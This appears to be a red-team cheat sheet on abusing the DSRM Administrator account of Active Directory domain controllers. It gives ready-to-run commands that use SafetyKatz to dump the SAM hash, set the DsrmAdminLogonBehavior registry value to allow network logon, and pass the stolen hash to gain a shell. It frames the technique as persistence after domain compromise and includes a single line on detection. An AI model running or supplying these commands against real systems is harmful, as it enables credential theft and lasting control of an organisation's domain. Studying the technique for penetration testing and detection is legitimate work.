# DSRM Administrator Abuse

Every DC has a local DSRM (Directory Services Restore Mode) Administrator account. Its hash can be extracted and used to authenticate remotely when a registry key is set.

## Extract DSRM Hash (requires DA)
Run from DC:
```
Loader.exe -path SafetyKatz.exe -args "token::evasive-elevate" "lsadump::evasive-sam" "exit"
```
Captures the local SAM Administrator (DSRM) hash.

## Enable Remote DSRM Login
Set `DsrmAdminLogonBehavior = 2` on the DC:
```powershell
# From DA session targeting DC
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
```
Value `2` = allow DSRM account to logon over network at any time.

## Pass-the-Hash with DSRM Account
```
Loader.exe -path SafetyKatz.exe -args "sekurlsa::pth /domain:<DC_HOSTNAME> /user:Administrator /ntlm:<dsrm_ntlm_hash> /run:cmd.exe" "exit"
```
Use `<DC_HOSTNAME>` (not FQDN) as domain for the local account.

## Notes
- Persists across domain password changes (DSRM password is local)
- Useful as a persistence mechanism after gaining DA
- Detectable by monitoring registry changes to `DsrmAdminLogonBehavior`
